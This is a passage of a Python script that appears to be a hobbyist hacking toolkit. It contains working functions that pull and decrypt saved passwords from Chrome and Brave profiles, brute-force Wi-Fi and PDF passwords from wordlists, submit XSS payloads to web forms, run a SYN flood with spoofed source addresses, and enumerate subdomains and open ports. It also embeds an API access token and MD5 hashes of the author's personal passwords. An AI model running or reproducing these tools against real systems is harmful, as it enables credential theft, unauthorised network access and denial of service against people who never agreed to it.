                listop=listop+"i"
            elif char=="/":
                listop=listop+" "
            elif char==j:
                listop=listop+"j"
            elif char==k:
                listop=listop+"k"
            elif char==l:
                listop=listop+"l"
            elif char==m:
                listop=listop+"m"
            elif char==n:
                listop=listop+"n"
            elif char==o:
                listop=listop+"o"
            elif char==p:
                listop=listop+"p"
            elif char==q:
                listop=listop+"q"
            elif char==r:
                listop=listop+"r"
            elif char==s:
                listop=listop+"s"
            elif char==t:
                listop=listop+"t"
            elif char==u:
                listop=listop+"u"
            elif char==v:
                listop=listop+"v"
            elif char==w:
                listop=listop+"w"
            elif char==x:
                listop=listop+"x"
            elif char==y:
                listop=listop+"y"
            elif char==z:
                listop=listop+"z"
            elif char==zero:
                listop=listop+"0"
            elif char==one:
                listop=listop+"1"
            elif char==two:
                listop=listop+"2"
            elif char==three:
                listop=listop+"3"
            elif char==four:
                listop=listop+"4"
            elif char==five:
                listop=listop+"5"
            elif char==six:
                listop=listop+"6"
            elif char==seven:
                listop=listop+"7"
            elif char==eight:
                listop=listop+"8"
            elif char==nine:
                listop=listop+"9"
            elif char==pl:
                listop=listop+"!"
            elif char==pp:
                listop=listop+"@"
            elif char==pq:
                listop=listop+"#"
            elif char==pr:
                listop=listop+"&"
            elif char==pu:
                listop=listop+"("
            elif char==pj:
                listop=listop+")"
            elif char==pa:
                listop=listop+"$"
            elif char==ps:
                listop=listop+"+"
            elif char==pd:
                listop=listop+"-"
            elif char==po:
                listop=listop+"="
            elif char==pi:
                listop=listop+"?"
            elif char==pf:
                listop=listop+"/"

        size = len(listop)
        xxaq=saltb
        xxaq=int(xxaq)
        salta=int(salta)
        listop=listop[salta:]
        listop=listop[:- xxaq]

        xopli=20598376985367568756956548765489675976539868450445687456985769846909698595886958596869869696909698595886958596869869696
        while xopli>0:
            xopli=xopli-5999999999999000939479890435886745986750679858679487696568969096985958869585968698696969096985958869585968698696969
            print(xopli, end="\r")
            xopli=xopli+100009869578968
            print(xopli, end="\r")
        xkolpil=20
        time.sleep(2)
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        time.sleep(0.5)
        print("Removing salt....")
        time.sleep(2)
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print("Preparing decrypted sentence....")
        time.sleep(7)
        while xkolpil>0:
            print(" ")
            xkolpil=xkolpil-1
        time.sleep(2)

        xolopo='Decrypted sentence:   '+listop
        print(xolopo)
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
        print(" ")
    else:
        print("Nothing called",xoll)
def dnsenumeration():
    target_domain=input("Enter domain: ")
    record_types = ["A", "AAAA", "CNAME", "MX", "NS", "SOA", "TXT"]
    resolver = dns.resolver.Resolver()
    for record_type in record_types:
        print(" ")
        time.sleep(2)
        try:
            answers = resolver.resolve(target_domain, record_type)
        except dns.resolver.NoAnswer:
            continue
        print(" \n")
        print(f"{record_type} records for {target_domain}:")
        time.sleep(2)
        for rdata in answers:
            print(f" {rdata}")
            time.sleep(0.5)
def encrypt_file():
    # Prompt the user to enter the encryption key
    key_input = input('Enter an encryption key:')
    while True:
        if len(key_input)<33:
            break
        else:
            print("Key can have max 32 characters")
    while True:
        if len(key_input)>3:
            break
        else:
            print("Key must have min 4 characters")
            key_input = input('Enter an encryption key:')
    key = base64.urlsafe_b64encode(key_input.encode().zfill(32))
    time.sleep(1)
    print(" ")
    path=input("Path of file: ")
    if not "//" in path:
        if "/" in path:
            path = path.replace('/', '//')
        if "\\" in path:
            path = path.replace("\\", '//')
    if '"' in path:
        path=path.replace('"'," ")
        path=path.strip()
    time.sleep(1)
    print(" ")
    updating_print("Encrypting")
    if "." in path:
        type=path.split(".")[1]
        nam=path.split(".")[0]


        cipher = Fernet(key)
        try:
            with open(path.strip(), 'rb') as file:
                file_data = file.read()

            # Encrypt the video data
            encrypted_data = cipher.encrypt(file_data)

            # Write the encrypted data to a new file
            with open(nam+"."+type.strip(), 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
            time.sleep(1)
            print(" ")
            print("Done :)")
        except Exception as e:
            print("e:",e)
    else:
        print("File name and extention also required in path")
def decrypt_file():
    # Prompt the user to enter the encryption key
    key_input = input("Enter the key: ")
    key = base64.urlsafe_b64encode(key_input.encode().zfill(32))
    time.sleep(1)
    print(" ")
    path=input("Path of encrypted file: ")
    if not "//" in path:
        if "/" in path:
            path = path.replace('/', '//')
        if "\\" in path:
            path = path.replace("\\", '//')
    if '"' in path:
        path=path.replace('"'," ")
        path=path.strip()
    time.sleep(1)
    print(" ")
    updating_print("Decrypting")
    if "." in path:
        with open(path, 'rb') as save_file:
            save_data=save_file.read()
        type=path.split(".")[1]
        nam=path.split(".")[0]

        try:
            cipher = Fernet(key)


            with open(path, 'rb') as encrypted_file:
                encrypted_data = encrypted_file.read()

            # Decrypt the encrypted data
            decrypted_data = cipher.decrypt(encrypted_data)

            # Write the decrypted data to a new file
            with open(path, 'wb') as decrypted_file:
                decrypted_file.write(decrypted_data)
            time.sleep(1)
            print(" ")
            print("Done :)")
        except Exception as e:
            with open(path, 'wb') as wasted_file:
                wasted_file.write(save_data)
                time.sleep(1)
            print("Error in reading or decrypting the file:  "+str(e))
def getipinfo():
    ip=input("Enter ip address: ")
    clear()
    ip_address=ip
    access_token = '5951072bd68878'
    handler = ipinfo.getHandler(access_token)
    details = handler.getDetails(ip_address)
    time.sleep(2)
    for key, value in details.all.items():
        print(" ")
        print(f"{key}: {value}")
        time.sleep(1)
def dhcplistener():
    print("")
    def print_packet(packet):
        target_mac, requested_ip, hostname, vendor_id = [None] * 4
        if packet.haslayer(Ether):
            target_mac = packet.getlayer(Ether).src
        dhcp_options = packet[DHCP].options
        for item in dhcp_options:
            try:
                label, value = item
            except ValueError:
                continue
            if label == 'requested_addr':
                requested_ip = value
            elif label == 'hostname':
                hostname = value.decode()
            elif label == 'vendor_class_id':
                vendor_id = value.decode()
        if target_mac and vendor_id and hostname and requested_ip:
            time_now = time.strftime("[%Y-%m-%d - %H:%M:%S]")
            print(f"{time_now} : {target_mac}  -  {hostname} / {vendor_id} requested {requested_ip}")
    sniff(prn=print_packet, filter='udp and (port 67 or port 68)')
def chrome_pass():
    def get_chrome_datetime(chromedate):
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""
    def main():
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            print(" ")
            time.sleep(1)
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                print(f"Origin URL: {origin_url}")
                time.sleep(0.1)
                print(f"Action URL: {action_url}")
                time.sleep(0.1)
                print(f"Username: {username}")
                time.sleep(0.1)
                print(f"Password: {password}")
                time.sleep(0.1)
            else:
                continue
            if date_created != 86400000000 and date_created:
                print(f"Creation date: {str(get_chrome_datetime(date_created))}")
                time.sleep(0.1)
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
                time.sleep(0.1)
            time.sleep(0.5)
            print(" ")
            print("="*50)
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
    main()
def brave_pass():
    def get_chrome_datetime(chromedate):
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    def get_encryption_key():
        #C:\Users\maddi\AppData\Local\BraveSoftware\Brave-Browser\User Data
        local_state_path = os.environ["USERPROFILE"]+'\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State'
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""
    def main():
        key = get_encryption_key()
        db_path = os.environ["USERPROFILE"]+'\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data'
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            print(" ")
            time.sleep(1)
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                print(f"Origin URL: {origin_url}")
                time.sleep(0.1)
                print(f"Action URL: {action_url}")
                time.sleep(0.1)
                print(f"Username: {username}")
                time.sleep(0.1)
                print(f"Password: {password}")
                time.sleep(0.1)
            else:
                continue
            if date_created != 86400000000 and date_created:
                print(f"Creation date: {str(get_chrome_datetime(date_created))}")
                time.sleep(0.1)
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
            time.sleep(0.5)
            print(" ")
            print("="*50)
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
    main()
def subdomains():
    type=0
    error=False
    domain=input("Enter domain: ")
    type=input("Deep/Light scan: ")
    domain=domain.strip()
    if "https://" in domain or "http://" in domain:
        try:
            domain1=domain.strip("https://")
            domain=domain1
        except:
            domain=domain.strip("http://")
    if "www." in domain:
        domain=domain.strip("www.")
    domain_end=domain[len(domain)-1]
    start_time = time.time()
    if "d" in type.strip():
        print("\n"+colored("WARN","yellow")+" Deep scan takes several times more time to complete than a regular scan (varies by website)")
        time.sleep(5)
        print(" ")
        file = open("wordlists/subdomains-deep.txt")
    else:
        file = open("wordlists/subdomains.txt")
    updating_print("Starting",colored(".","green"))
    time.sleep(1)
    print(" ")
    content = file.read()
    subdomains = content.splitlines()
    discovered_subdomains = []
    yes=0
    no=0
    totl=0
    lines=0
    glitch=False
    helpr=0
    for subdomain in subdomains:
        lines=lines+1
    dont_show=False
    for subdomain in subdomains:
        totl=totl+1
        percent_accurate=totl/lines*100
        percent_accurate=str(percent_accurate)
        percent=percent_accurate.split(".")[0]
        url = f"http://{subdomain}.{domain}"
        try:
            requests.get(url,timeout=2)
        except requests.ConnectionError:
            no=no+1
            helpr=0
            stripped=url.strip('http://')
            #print(colored("[x] "+ stripped+"p ","red")+" ["+str(percent)+"%]", end=" ")
            print(colored(f"[{str(percent)}%] "+stripped+" ","red"), end=" ")
            if type==0:
                print("                                             ", end="\r")
            else:
                print("                                             ", end=" ")
            continue
        except Exception as e:
            error=True
            helpr=0
            exception=e
        else:
            helpr=helpr+1
            print(" ",end=" ")
            print(colored("[+] Found: "+ url,"green"))
            yes=yes+1
            discovered_subdomains.append(url)
        if helpr>13:
            clear()
            time.sleep(1)
            print(colored("\nERROR:"+"This website cannot be scanned","red")+"\nThis website uses a 404 page that redirects to a live page for all the subdomains causing the scanner to think all subdomains are live\nThis type of routing is usually done by services like Microsoft Azure")
            dont_show=True
            time.sleep(15)
            break
    end=time.time()
    time_taken=end - start_time
    sec=str(time_taken)
    time.sleep(1)
    if dont_show!=True:
        clear()
    time.sleep(1)
    print('\n')
    time.sleep(1)
    if dont_show!=True:
        print("Scanned",colored(totl,"white",attrs=["bold"]),"subdomains in",sec,"seconds")
        time.sleep(1)
        print("\n")
        time.sleep(1)
        print(colored("Found:",'cyan'))
        for subdomain in discovered_subdomains:
            print(" ",end=" ")
            time.sleep(0.8)
            print(colored(subdomain,"green"))
        if error:
            x=colored("ERROR:"+str(exception),"red")
            print("An error had occoured during scanning but was ignored:\n",str(x))
    elif dont_show==True:
        print("Try a different domain :(")
def pdfcrack():
    print(' ')
    target=input(r"Enter path of pdf file: ").strip()
    try:
        target=target.strip("'")
    except:
        try:
            target=target.strip('"')
        except:
            pass
    time.sleep(2)
    print(" ")
    type=input("Number/Text/Mixed scan: ").strip()
    if "nu" in type:
        #numbers
        file="wordlists/wordlist_num.txt"
    elif "te" in type:
        #text and some numbers
        file="wordlists/wordlist_all.txt"
    else:
        #text and some numbers
        file="wordlists/wordlist_all.txt"

    found=False
    while True:
        file_path = Path(target)
        if file_path.is_file() and file_path.suffix.lower() == ".pdf":
            print(" ")
            break
        else:
            print(colored("ERROR: Not a valid pdf file", "red"))
            target = input("Enter path of pdf file: ").strip()
    time.sleep(3)
    print("Generate personal wordlist to use along with brute force wordlist?")
    time.sleep(2)
    golgi=input("Y/n: ").lower()
    time.sleep(1)
    passwords = []
    if "y" in golgi:
        print(" ")
        updating_print("Starting personal wordlist generator")
        clear()
        database=personal()
        for word in database:
            passwords.append(word)
    for line in open(file):
        line=line.strip()
        if line=="":
            continue
        else:
            passwords.append(line)
    lines=0
    for password in passwords:
        lines=lines+1
    print(lines)
    now=0

    for password in passwords:
        time.sleep(0.05)
        legth=str(len(password))
        now=now+1
        percent=str(now/lines*100)
        percent=percent.split(".")[0]
        try:
            with pikepdf.open(target.strip(), password=password) as pdf:
                found=True
                passwordswe=password
                print(" ",end=" ")
                print(" ")
                print(colored("[+] Found: "+password,"green"))
                break
        except pikepdf.PasswordError as e:
            print(colored(f"[{str(percent)}%] Trying-"+" passwords>"+password,"red"), end=" ")
            print("                                             ", end="\r")
            continue
        except Exception as e:
            continue
    if found != True:
        time.sleep(0.5)
        print(colored("[x] Couldnt crack password","red"))
        time.sleep(1)
def faker():
    updating_print("Generating fake profile",colored(".","green"))
    fake = Faker()
    name=fake.name()
    job=fake.job()
    dob=fake.date_of_birth().strftime('%Y-%m-%d')
    city = fake.city()
    addr = fake.address()
    zip=fake.zipcode()
    ph=fake.phone_number()
    first_name, last_name = name.split(' ')
    mails=["gmail.com","yahoo.com","hotmail.com"]
    email = '{}.{}@{}'.format(first_name.lower(), last_name.lower(), random.choice(mails))
    ipv4=fake.ipv4()
    mac=fake.mac_address()
    time.sleep(1)
    print(" ")
    large=15
    time.sleep(1)
    print(" ")
    time.sleep(2)
    dict={"Name":name,"Job":job,"DateOfBirth":dob,"Address":addr,"Zip":zip,"Phone":ph,"Email":email,"City":city,"IP":ipv4,"MAC":mac}#just as a profile
    for key in dict:
        length=int(large-int(len(key)))
        x=colored(key,"cyan")+colored("-","cyan",attrs=["bold"])+length*" "+dict[key]
        print(x)
        time.sleep(1.5)
def wyfy():
    now=0
    cracked=False
    client_ssid = input("SSID(name) of network:")
    path_to_file = "wordlists/wordlist_wifi.txt"
    totl=0
    with open(path_to_file, 'r', encoding='utf8') as words:
        for line in words:
            totl=totl+1
    time.sleep(2)
    print(" ")
    time.sleep(3.5)
    print(colored("Accurate","white",attrs=["bold"])+"-Higher chance of cracking on special networks but time consuming "+colored("(best if network connectivity is low)","white",attrs=["bold"]))
    time.sleep(1)
    print(colored("Fast","white",attrs=["bold"])+"-Faster than Accurate mode"+colored(" (best if network connectivity is high)","white",attrs=["bold"]))
    time.sleep(2.5)
    type=input("Accurate/Fast:").strip().lower()
    time.sleep(2)
    print(" ")
    time.sleep(3)

    if "acc" in type:
        time_of_sleep=2
        print(colored("MAY TAKE A VERY LONG TIME (best if network connectivity is low)","white",attrs=["bold"]))
        time.sleep(5)
    else:
        time_of_sleep=0.2
        print(colored("MAY NOT WORK ON SOME NETWORKS (best if network connectivity is good)","white",attrs=["bold"]))
        time.sleep(5)

    try:
        # Interface information
        wifi = PyWiFi()
        ifaces = wifi.interfaces()[0]  # for wifi we use index - 0

        ifaces.scan() #check the card
        results = ifaces.scan_results() #Obtain the results of the previous triggerred scan. A Profile list will be returned.


        wifi = pywifi.PyWiFi() # A Profile is the settings of the AP we want to connect to
        iface = wifi.interfaces()[0]

    except Exception as  e:
        print("Error:\n"+str(e))

    type = False

    def main(ssid, password, number):

        profile = pywifi.Profile()  # create profile instance
        profile.ssid = ssid  #name of client
        profile.auth = const.AUTH_ALG_OPEN # auth algo
        profile.akm.append(const.AKM_TYPE_WPA2PSK) # key management
        profile.cipher = const.CIPHER_TYPE_CCMP #type of cipher


        profile.key = password
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        time.sleep(time_of_sleep)
        iface.connect(tmp_profile)
        time.sleep(0.35)

        if ifaces.status() == const.IFACE_CONNECTED:
            time.sleep(1)
            print(" ")
            time.sleep(1)
            print(" ")
            time.sleep(3)
            print(colored('Cracked :)','green'))
            time.sleep(4)
            print(colored('Password: ',"green")+colored(password,"cyan",attrs=["bold"]))
            cracked=True
            time.sleep(1)
            print(" ")
            exit()
        else:
            cracked=False
            percent=number/totl*100
            #fix this
            print(colored("["+str(int(percent))+"%]Trying:"+password,"red"),end="\r")
    def pwd(ssid, file):
        number = 0
        with open(file, 'r', encoding='utf8') as words:
            for line in words:
                number += 1
                line = line.split("\n")
                pwd = line[0]
                main(ssid, pwd, number)



    def menu(client_ssid,path_to_file):
        ssid = client_ssid
        filee = path_to_file
        if os.path.exists(filee):
            clear()
            updating_print("Starting",colored(".","green"),8)
            time.sleep(3)
            print(" ")
            pwd(ssid, filee)

        else:
            print(colored("No Such File","red"))
    menu(client_ssid , path_to_file)
    print(" ")
    time.sleep(3)
    if cracked:
        print("To get administrator access to this wifi,use the "+colored("wifi_privilidge","blue")+colored("(not released yet)","yellow")+" option")
    print("please off and on wifi")


#Beta scripts ↓
def xss(url):
    def get_all_forms(url):
        soup = bs(requests.get(url).content, "html.parser")
        return soup.find_all("form")
    def get_form_details(form):
        details = {}
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details
    def submit_form(form_details, url, value):
        target_url = urljoin(url, form_details["action"])
        inputs = form_details["inputs"]
        data = {}
        for input in inputs:
            if input["type"] == "text" or input["type"] == "search":
                input["value"] = value
            input_name = input.get("name")
            input_value = input.get("value")
            if input_name and input_value:
                data[input_name] = input_value
        print(f"[+] Submitting malicious payload to {target_url}")
        print(f"[+] Data: {data}")
        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)
    def scan_xss(url):
        forms = get_all_forms(url)
        print(f"[+] Detected {len(forms)} forms on {url}.")
        js_script = "<Script>alert('hi')</scripT>"
        is_vulnerable = False
        for form in forms:
            form_details = get_form_details(form)
            content = submit_form(form_details, url, js_script).content.decode()
            if js_script in content:
                print(f"[+] XSS Detected on {url}")
                print(f"[*] Form details:")
                pprint(form_details)
                is_vulnerable = True
        return is_vulnerable
    return scan_xss(url)#beta
def portscan(host):
    host=str(host.strip())
    updating_print("Starting scan",colored(".","green"),8)
    nm=nmap.PortScanner()
    nm.scan(host.strip(),'0-443')
    print(" ")
    time.sleep(1)
    all=nm.all_hosts()
    state=nm[host].state()
    print("Host is",state)
    time.sleep(4)
    for host in all:
        print('--------------------------------------------------------------------------')
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        for proto in nm[host].all_protocols():
            print('----------------------------------')
            print('Protocol : %s' % proto)
            lport = nm[host][proto].keys()
            lport = list(lport)
            lport.sort()
            for port in lport:
                print ('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))#beta
def stenography(target,text,type):
    def to_bin(data):
        if isinstance(data, str):
            return ''.join([ format(ord(i), "08b") for i in data ])
        elif isinstance(data, bytes):
            return ''.join([ format(i, "08b") for i in data ])
        elif isinstance(data, np.ndarray):
            return [ format(i, "08b") for i in data ]
        elif isinstance(data, int) or isinstance(data, np.uint8):
            return format(data, "08b")
        else:
            raise TypeError("Type not supported.")
    def encode(image_name, secret_data):
        image = cv2.imread(image_name)
        n_bytes = image.shape[0] * image.shape[1] * 3 // 8
        print("[*] Maximum bytes to encode:", n_bytes)
        if len(secret_data) > n_bytes:
            raise ValueError("[!] Insufficient bytes, need bigger image or less data.")
        updating_print("[*] Encoding data",colored(".","green"))
        secret_data += "==x=="
        data_index = 0
        binary_secret_data = to_bin(secret_data)
        data_len = len(binary_secret_data)
        for row in image:
            for pixel in row:
                r, g, b = to_bin(pixel)
                if data_index < data_len:
                    pixel[0] = int(r[:-1] + binary_secret_data[data_index], 2)
                    data_index += 1
                if data_index < data_len:
                    pixel[1] = int(g[:-1] + binary_secret_data[data_index], 2)
                    data_index += 1
                if data_index < data_len:
                    pixel[2] = int(b[:-1] + binary_secret_data[data_index], 2)
                    data_index += 1
                if data_index >= data_len:
                    break
        return image
    def decode(image_name):
        updating_print("[+] Decoding",colored(".","green"))
        image = cv2.imread(image_name)
        binary_data = ""
        for row in image:
            for pixel in row:
                r, g, b = to_bin(pixel)
                binary_data += r[-1]
                binary_data += g[-1]
                binary_data += b[-1]
        # split by 8-bits
        all_bytes = [ binary_data[i: i+8] for i in range(0, len(binary_data), 8) ]
        # convert from bits to characters
        decoded_data = ""
        for byte in all_bytes:
            decoded_data += chr(int(byte, 2))
            if decoded_data[-5:] == "==x==":
                break
        return decoded_data[:-5]
    if "enc" in type:
        input_image = target
        out=target.strip().split(".")
        output_image = out[0]+"_encoded."+out[1]
        secret_data = text
        encoded_image = encode(image_name=input_image, secret_data=secret_data)
        cv2.imwrite(output_image, encoded_image)
    elif "dec" in type:
        decoded_data = decode(output_image)
        print("[+] Decoded data:", decoded_data)#under dev
def syn_flooding(target_ip,port):
    print("Started...\n")
    target_ip = str(target_ip)
    target_port = int(port)
    def randomIp():
        Iplist=["27.80.244.1","196.40.81.1","174.34.98.1","43.78.130.1","116.14.117.1","245.232.87.1","216.159.206.233","198.204.22.239","53.188.63.173","148.86.140.181","209.179.165.20","234.48.7.227","0.104.153.178","179.221.231.141","110.125.61.208","148.62.71.122","43.76.230.207","62.225.226.136","202.207.194.25","189.38.210.64","176.178.251.174","107.119.181.55","23.63.242.224","88.252.229.13","11.0.108.240","208.199.212.1","205.111.153.224","190.4.165.138","72.63.152.73","49.211.169.132","47.161.98.137","134.219.16.150","8.81.221.76","98.119.192.174","212.200.13.5","252.193.136.2","213.200.185.224","62.77.99.217","145.158.230.132","95.122.169.25","204.104.181.68","217.59.61.21","122.180.87.96","195.62.73.107","187.69.109.89","133.77.82.135","79.161.103.20","61.195.227.83","128.138.166.177","182.144.22.42"]
        ip=random.choice(Iplist)
        ip=ip+"/24"
        ip=RandIP(str(ip))
        return str(ip)
    def randomByte():
        bytes=[1024,2048,3072]
        byte=random.choice(bytes)
        return int(byte)

    ip = IP(src=randomIp(), dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X"*randomByte())
    p = ip / tcp / raw
    send(p, loop=1, verbose=1)


#GAMMA SCRIPTS
def escalate():
    trials=3
    esc=False
    num=0
    finite=25
    pass1=False
    time.sleep(10)
    while pass1!=True:
        while True:
            if trials!=0:
                print(" ")
                time.sleep(2)
                print("Type 'f'  if you have forgotten the password")
                passw=input("Enter password: ").strip().lower()
                trials=trials-1
                try:
                    import hashlib

                    def calculate_md5_hash(string):
                        md5_hash = hashlib.md5()
                        md5_hash.update(string.encode('utf-8'))
                        return md5_hash.hexdigest()

                    # Example usage
                    input_string = passw
                    entered = calculate_md5_hash(input_string)

                    already="C731077C04035AC9E92A3706288DB18F"
                    if entered.strip().lower()==already.strip().lower():
                        trials=3
                        pass1=True
                        break
                    else:
                        print('Wrong password')

                except Exception as e:
                    print("ERR:",e)
                if "f" in passw:
                    time.sleep(5)
                    y=input("If you really are AdhritTheGreat,\nEnter the original password you used for your accounts(google,gmail,etc): ").strip().lower()
                    try:
                        import hashlib

                        def calculate_md5_hash(string):
                            md5_hash = hashlib.md5()
                            md5_hash.update(string.encode('utf-8'))
                            return md5_hash.hexdigest()

                        # Example usage
                        input_string = y
                        entered = calculate_md5_hash(input_string)
                        print(entered)
                        already="630bd069033a98cf4614986fcbfc4fe7"
                        secnd="36734b378463e8cb6ac83a05b2c52b9b"

                        if (entered.strip().lower()==already.strip().lower()) or (entered.strip().lower()==secnd.strip().lower()):
                            trials=3
                            num=0
                            time.sleep(1)
                            print(" ")
                            time.sleep(1)
                            print("Reenter the password on this link:           https://1drv.ms/t/s!Ar7r5S2_XsE-huMPr8-3Ud3giu9fFw?e=zHW68J\nIf it doesnt work,try this link and enter the same password:           https://1drv.ms/t/s!Ar7r5S2_XsE-huMQfEwXrhcx2zLotg?e=hcTua5")
                        else:
                            time.sleep(1)
                            print('Wrong password')
                            time.sleep(0.5)

                    except Exception as e:
                        print("ERR:",e)
            else:
                num=num+1
                timer=25*num
                print("Too many wrong attempts.\nWait for "+str(timer)+" seconds")
                time.sleep(timer)
                trials=2
                finite=finite-1
                if finite==0:
                    print("Too many incorrect attemts.\nRestart code to try again")
                    while True:
                        time.sleep(10)
    if pass1==True:
        print(" ")
        time.sleep(5)
        print("PASS AUTHORISED\nUSE THIS PASSWORD FOR UNLOCKING FUTURE ENCRYPTED FUNCTIONS")
        esc=True





#always use clear()
clear()




#main code:
wyfy()



#stuffas for the intraface
in_main=True
in_wifi=False

#-----------------------------------------------------------------

#use this poop to make the interface
